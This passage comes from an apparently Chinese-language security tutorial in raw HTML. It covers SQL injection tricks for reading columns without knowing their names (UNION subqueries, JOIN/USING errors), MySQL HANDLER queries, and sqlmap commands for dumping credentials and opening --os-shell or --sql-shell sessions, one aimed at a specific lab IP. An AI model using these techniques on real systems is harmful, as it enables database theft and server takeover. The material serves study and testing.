class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | 321        |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | Dummy<span class="string">&#x27;#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 我们将列名替换成为了 数字 1,2,3</span></span><br><span class="line"><span class="string"># 那么我们就可以使用数字来对应其中的列名</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `2` from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这时我们已经取到了第二列的内容</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当 `` 被过滤时，使用别名代替</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| b        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同时查询多列</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------------------+</span><br><span class="line">| concat(`2`,0x5e,`3`) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2^3                  |</span><br><span class="line">| Dumb^Dumb            |</span><br><span class="line">| Angelina^I-kill-you  |</span><br><span class="line">| Dummy^321            |</span><br><span class="line">| secure^crappy        |</span><br><span class="line">| stupid^stupidity     |</span><br><span class="line">| superman^genious     |</span><br><span class="line">| batman^mob!le        |</span><br><span class="line">| admin^admin          |</span><br><span class="line">| admin1^admin1        |</span><br><span class="line">| admin2^admin2        |</span><br><span class="line">| admin3^admin3        |</span><br><span class="line">| dhakkan^dumbo        |</span><br><span class="line">| admin4^admin4        |</span><br><span class="line">| Dummy<span class="string">&#x27;#^123          |</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1;</span></span><br></pre></td></tr></table></figure><h3 id="15-3-JOIN-爆破"><a href="#15-3-JOIN-爆破" class="headerlink" title="15.3 JOIN 爆破"></a>15.3 JOIN 爆破</h3><p>本质：通过 <strong>报错</strong> 得到列名</p><ul><li>join 连接两张表</li><li>using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用语句 select * from (select * from 表名 as a join 表名 as b)as c;</span></span><br><span class="line"><span class="comment"># 一一爆字段</span></span><br><span class="line">select * from (select * from users as a join news as b)as c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id))c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id,name))c;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">select * from (select * from users a join users b using(id,name,passwd))c;</span><br></pre></td></tr></table></figure><p>测试 </p><p>创建表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table users(id int,name varchar(20),passwd varchar(32));</span><br><span class="line">insert into users value(1,<span class="string">&#x27;mickey&#x27;</span>,<span class="string">&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">create table news(is_admin int(1),id int(2),title varchar(100),date date);</span><br><span class="line">insert into news values(1,1,<span class="string">&#x27;hello,mickey&#x27;</span>,now());</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from users as a join news as b)as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">| id   | name   | passwd                           |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">|    1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;is_admin&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">| is_admin | id   | title        | date       |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">|        1 |    1 | hello,mickey | 2021-07-26 |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure><h2 id="十六、Mysql-查询语句-之-Handler"><a href="#十六、Mysql-查询语句-之-Handler" class="headerlink" title="十六、Mysql 查询语句 之 Handler"></a>十六、Mysql 查询语句 之 Handler</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p><ul><li>mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</li><li>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</li><li>可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。</li></ul><p><strong>测试：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database practice;</span><br><span class="line">use practice;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> handler_table(id <span class="type">int</span>,username <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">desc</span> handler_table;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;李华&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;小马&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;张鑫&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;周明&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;蔡紫&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> handler_tables;</span><br></pre></td></tr></table></figure><p><strong>不通过索引查表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查询数据</span><br><span class="line">handler handler_table read <span class="keyword">first</span>;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/02/yvMD6oPbEw514RG.png" alt="image-20210602174326041"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler handler_table <span class="keyword">close</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler handler_table read next;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;handler_table&#x27;</span> <span class="keyword">in</span> HANDLER</span><br></pre></td></tr></table></figure><p><strong>通过索引查表：需要创建索引</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄，命名为 p</span><br><span class="line">handler handler_table <span class="keyword">open</span> <span class="keyword">as</span> p;</span><br><span class="line">#查看数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;#第一行</span><br><span class="line">handler p read handler_index next;#下一行</span><br><span class="line">handler p read handler_index prev;#上一行</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;#最后一行</span><br><span class="line">#关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查看特定位置的数据</span><br><span class="line">handler p handler_table read handler_index<span class="operator">=</span>(<span class="number">3</span>);</span><br><span class="line">handler handler_table read handler_index <span class="keyword">first</span>;#查第一条</span><br><span class="line">handler handler_table read handler_index next;#查下一条</span><br><span class="line">handler handler_table read handler_index prev;#查上一条</span><br><span class="line">handler handler_table read handler_index <span class="keyword">last</span>;#查最后一条</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#删除索引</span><br><span class="line"><span class="keyword">drop</span> index handler_index <span class="keyword">on</span> handler_table;</span><br></pre></td></tr></table></figure><p><strong>Handler 与 select 的比较：</strong></p><ul><li> select语句一次返回所有相关行，handler每次返回一行</li><li> HANDLER涉及的分析较少，比SELECT更快</li><li> 没有优化程序或查询校验开销</li><li> 在两个管理程序请求之间，不需要锁定表。</li></ul><p><a href="https://blog.csdn.net/JesseYoung/article/details/40785137?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162262623916780264055048%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162262623916780264055048&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-40785137.pc_search_result_cache&utm_term=mysql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5-handler&spm=1018.2226.3001.4187">参考</a></p><h2 id="十七、SQLmap"><a href="#十七、SQLmap" class="headerlink" title="十七、SQLmap"></a>十七、SQLmap</h2><h3 id="17-1-基本手法"><a href="#17-1-基本手法" class="headerlink" title="17.1 基本手法"></a>17.1 基本手法</h3><p><strong>简介</strong></p><ul><li>支持大量的数据库</li><li>支持多种SQL注入：布尔盲注，时间注入，报错注入，联合查询，堆叠注入，使用脚本</li><li>加上 <code>-v -3 </code> 会显示出其注入语句</li></ul> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">手册：python sqlmap.py <span class="operator">-</span>hh</span><br><span class="line"></span><br><span class="line"> 导航：python sqlmap.py <span class="comment">--wizard</span></span><br><span class="line"></span><br><span class="line"> 测试URL: python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br></pre></td></tr></table></figure><p><strong>常用测试（不确定注入手段）</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--tamper randomcase.py</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--level 3</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>level用于设置注入等级<span class="number">1</span><span class="operator">~</span><span class="number">6</span>，等级越高，包括的自动注入手段越多</span><br></pre></td></tr></table></figure><p><strong>查看权限</strong></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--privileges #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--roles  #枚举数据库用户角色</span></span><br></pre></td></tr></table></figure><p><strong>基本信息命令</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看所有用户：当当前用户有权限去读取包含所有用户的表的权限时，该命令可以列出所有的管理员用户</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--users</span></span><br><span class="line"></span><br><span class="line"> 查看当前用户：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"></span><br><span class="line"> 查看所有用户的 数据库用户密码：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line"> 获取 shell:</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/BrAmhPs7UnYjp3Q.png" alt="image-20210914193530736"></p><p><strong>常用注入命令</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看数据库</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">查看 当前 网站数据库：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-db</span></span><br><span class="line"> </span><br><span class="line"> 获取当前网站数据库用户的名称：</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"> </span><br><span class="line"> 查表</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="comment">--tables</span></span><br><span class="line"> </span><br><span class="line"> 查列</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="comment">--columns</span></span><br><span class="line"> </span><br><span class="line"> 查字段内容</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="operator">-</span>C &quot;username,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure><p><strong>POST 表单，登录框注入</strong></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">notepad post.txt将post请求复制粘贴过去</span><br><span class="line"></span><br><span class="line">post请求；python sqlmap.py <span class="operator">-</span>r &quot;post.txt(包含有post请求的文件)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-11</span><span class="operator">/</span> <span class="comment">--forms --level=5 --dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径<span class="operator">+</span>文件名.txt  <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--password --batch</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--os-shell</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="comment">--tables</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="comment">--columns</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="operator">-</span>C &quot;字段名（注意：包含所有的）&quot; <span class="comment">--dump</span></span><br><span class="line"> </span><br><span class="line">  python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--priveliges  #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shell</span><br><span class="line">select @@version;  &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;</span><br><span class="line">select @@plugin_dir;  &#x27;/usr/lib/mysql/plugin/&#x27;</span><br></pre></td></tr></table></figure><h3 id="17-2-进阶"><a href="#17-2-进阶" class="headerlink" title="17.2 进阶"></a>17.2 进阶</h3><ul><li><p><strong>探测等级：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--level 5</span><br><span class="line">--level 2 # HTTP cookie等</span><br><span class="line">--level 3 # HTTP User-Agent/Referer等</span><br></pre></td></tr></table></figure><p>一共五个等级，不加 level 时等级为1，等级越高，进行测试的 Payload 越多。会自动破解出 cookie XFF等注入方式。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--is-dba # 当前用户是否是管理员权限，即当前账户是否是数据管理员账户</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/r6X9vWdYTU4zKZ1.png" alt="image-20210914194547728"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--roles # 列出数据库管理员角色</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/cOlnf2PFYtaILp4.png" alt="image-20210914194708971"></p><p>查看数据库用户角色，如果当前用户有权限读取包含所有用户的表时，即可列出。该命令仅仅适用于数据库是  Oracle 时。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--referer http://www.baidu.com</span></span><br><span class="line"># sqlmap 可进行伪造 HTTP 中的 Referer 头，当 <span class="comment">--level &gt;=3 时，可使用  referer 欺骗</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--sql-shell # 运行自定义的 sql 语句</span></span><br><span class="line"># 会进入 <span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> 交互，可直接输入 <span class="keyword">sql</span> 语句进行执行</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/NTF4gzJ6BOXkfDh.png" alt="image-20210914195201939"></p><figure class="highlight 